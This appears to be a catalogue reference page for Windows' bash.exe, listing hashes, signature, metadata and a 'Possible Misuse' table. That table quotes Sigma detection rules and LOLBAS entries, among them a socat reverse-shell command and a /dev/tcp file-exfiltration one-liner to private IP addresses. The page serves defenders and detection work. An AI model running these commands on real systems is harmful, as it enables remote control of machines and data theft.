---
title: bash.exe | Microsoft Bash Launcher
---

# bash.exe 

* File Path: `C:\Windows\system32\bash.exe`
* Description: Microsoft Bash Launcher

## Hashes

Type | Hash
-- | --
MD5 | `FB0A628075D0396D905BD689F5C08D5E`
SHA1 | `5E4EF17328EC5C939F3E6A0DAD0B23432CFD61DB`
SHA256 | `E7FD310E7E8677A8C497EFADD42F2CA67D868CAD07E569E8092B1A1FBA17EC99`
SHA384 | `3A32401A8F9293B3B73812DCAC825065D54418300BCBCAEAE0FC9EBC7BA283F775C69577F47B7F8F2673F6F58FCDF68E`
SHA512 | `5B9273188C9D635410AEC98E1175DBED1D5A4B8BD91C50CBE02C79B3C249E1630B5091187D2DC15FD964BA8868BC4A2FFB36FA7D71C2F2A004551CCBC2E9F135`
SSDEEP | `6144:HzOZYndZkEXDvoc9qQEbjjOF59xXpJ2CnD8SWLWY:6ZYdZRXDvCQmjcFdD8S`

## Runtime Data

### Usage (stdout):
```Batchfile
Windows Subsystem for Linux has no installed distributions.
Distributions can be installed by visiting the Microsoft Store:
https://aka.ms/wslstore

```

### Loaded Modules:

Path |
-- |
C:\Users\user\AppData\Local\GitHubDesktop\app-2.5.4\resources\app\git\usr\bin\basenc.exe |
C:\Windows\System32\KERNEL32.DLL |
C:\Windows\System32\KERNELBASE.dll |
C:\Windows\SYSTEM32\ntdll.dll |


## Signature

* Status: Signature verified.
* Serial: `3300000266BD1580EFA75CD6D3000000000266`
* Thumbprint: `A4341B9FD50FB9964283220A36A1EF6F6FAA7840`
* Issuer: CN=Microsoft Windows Production PCA 2011, O=Microsoft Corporation, L=Redmond, S=Washington, C=US
* Subject: CN=Microsoft Windows, O=Microsoft Corporation, L=Redmond, S=Washington, C=US

## File Metadata

* Original Filename: Bash.exe.mui
* Product Name: Microsoft Windows Operating System
* Company Name: Microsoft Corporation
* File Version: 10.0.17763.1 (WinBuild.160101.0800)
* Product Version: 10.0.17763.1
* Language: English (United States)
* Legal Copyright:  Microsoft Corporation. All rights reserved.


## Possible Misuse

*The following table contains possible examples of `bash.exe` being misused. While `bash.exe` is **not** inherently malicious, its legitimate functionality can by abused for malicious purposes.*

Source | Source File | Example | License
-- | -- | -- | --
[sigma](https://github.com/Neo23x0/sigma) | [sysmon_suspicious_dbghelp_dbgcore_load.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/image_load/sysmon_suspicious_dbghelp_dbgcore_load.yml) | `            - '\bash.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_mmc_spawn_shell.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_mmc_spawn_shell.yml) | `            - '*\bash.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_mshta_spawn_shell.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_mshta_spawn_shell.yml) | `            - '*\bash.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_office_shell.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_office_shell.yml) | `            - '*\bash.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_webshell_spawn.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_webshell_spawn.yml) | `            - '*\bash.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [sysmon_suspicious_remote_thread.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/sysmon/sysmon_suspicious_remote_thread.yml) | `            - '\bash.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Bash.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Bash.yml) | `Name: Bash.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Bash.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Bash.yml) | `  - Command: bash.exe -c calc.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Bash.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Bash.yml) | `    Description: Executes calc.exe from bash.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Bash.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Bash.yml) | `  - Command: bash.exe -c "socat tcp-connect:192.168.1.9:66 exec:sh,pty,stderr,setsid,sigint,sane"` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Bash.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Bash.yml) | `  - Command: bash.exe -c 'cat file_to_exfil.zip > /dev/tcp/192.168.1.10/24'` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Bash.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Bash.yml) | `  - Path: C:\Windows\System32\bash.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Bash.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Bash.yml) | `  - Path: C:\Windows\SysWOW64\bash.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Bash.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Bash.yml) | `  - IOC: Child process from bash.exe` | 



MIT License. Copyright (c) 2020 Strontic.


